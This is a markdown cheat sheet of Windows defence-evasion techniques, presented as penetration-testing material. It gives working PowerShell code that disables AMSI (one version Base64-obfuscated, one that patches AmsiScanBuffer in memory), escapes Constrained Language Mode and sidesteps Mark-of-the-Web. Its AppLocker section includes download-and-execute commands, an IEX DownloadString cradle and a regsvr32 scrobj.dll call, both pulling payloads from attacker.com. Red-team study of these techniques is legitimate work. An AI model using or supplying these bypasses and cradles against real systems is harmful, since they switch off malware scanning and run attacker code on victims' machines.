# Windows Security Bypass Techniques

This document contains techniques for bypassing Windows security mechanisms
during penetration testing.

---

## 1. AMSI Bypass Methods

The Antimalware Scan Interface (AMSI) in Windows scans scripts before execution.
These techniques can bypass this protection.

### PowerShell AMSI Bypass - Reflection Method

```powershell
# This reflection-based technique sets the "amsiInitFailed" field to true
# The strings are Base64 encoded to avoid detection
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Alternative AMSI Bypass Techniques

If the above method is blocked, try alternatives from this repository:

- [AMSI Bypass Collection](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

### Memory Patching Technique

```powershell
# Another approach that patches AMSI in memory
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [UIntPtr]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

---

## 2. Mark-of-the-Web (MOTW) Bypass

Mark-of-the-Web is a security feature that adds a Zone.Identifier to files
downloaded from the internet, triggering security warnings.

### Understanding MOTW

- Detailed
  explanation: [Outflank MOTW Analysis](https://www.outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/)

### MOTW Bypass Methods

```bash
# 1. Use 7zip to extract files (preserves no Zone.Identifier)
7z.exe x archive.zip

# 2. Use git to clone repositories (files have no MOTW)
git clone https://github.com/example/repo

# 3. Use alternative archive formats
# ISO files - Windows treats mounted ISOs as local drives
# VHD/VHDX files - Mounted virtual disks bypass MOTW
```

---

## 3. Application Whitelisting Bypasses

### PowerShell Constrained Language Mode Bypass

```powershell
# Check if in Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode

# Bypass using reflection
$Ref = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures', 'NonPublic,Static')
$Ref.SetValue($null, (New-Object Collections.Generic.HashSet[string]))
```

### AppLocker Bypass

```powershell
# Run PowerShell from allowed paths
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Use alternative executables
# - rundll32.exe
# - regsvr32.exe
# - regasm.exe
# - installutil.exe
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll
```
